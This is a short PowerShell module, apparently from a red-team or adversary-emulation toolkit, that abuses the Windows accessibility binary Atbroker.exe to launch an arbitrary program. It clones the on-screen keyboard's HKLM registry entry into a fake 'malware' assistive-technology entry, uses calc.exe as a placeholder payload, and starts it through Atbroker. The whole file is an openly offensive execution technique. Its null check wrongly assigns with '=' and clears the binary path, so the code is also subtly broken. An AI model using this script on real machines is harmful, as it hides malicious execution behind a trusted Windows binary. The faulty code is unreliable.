<# 
    .Synopsis
    Atbroker.exe abuse to launch malicious process

    .Description
    https://lolbas-project.github.io/lolbas/Binaries/Atbroker/

#>
function Start-Atbroker {
    $binpaths = @('C:\Windows\System32\Atbroker.exe','C:\Windows\SysWOW64\Atbroker.exe')
    $binparams = '/start malware'

    ForEach ($bp in $binpaths) {
        if (Test-Path $bp) {
            $binpath = $bp
            break
        }
    }

    # Handle this better
    if ($binpath = $null) {
        return
    }

    # Clone an existing AT broker:
    Copy-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\osk\' -Destination 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware' -Recurse

    # Modify keys to launch malware
    Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware' -Name 'ATExe' -value 'calc.exe'
    Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware' -Name 'StartExe' -value '%SystemRoot%\System32\calc.exe'

    # Start malicious binary
    Start-Process -FilePath $binpath -ArgumentList $binparams
}
Export-ModuleMember -Function Start-Atbroker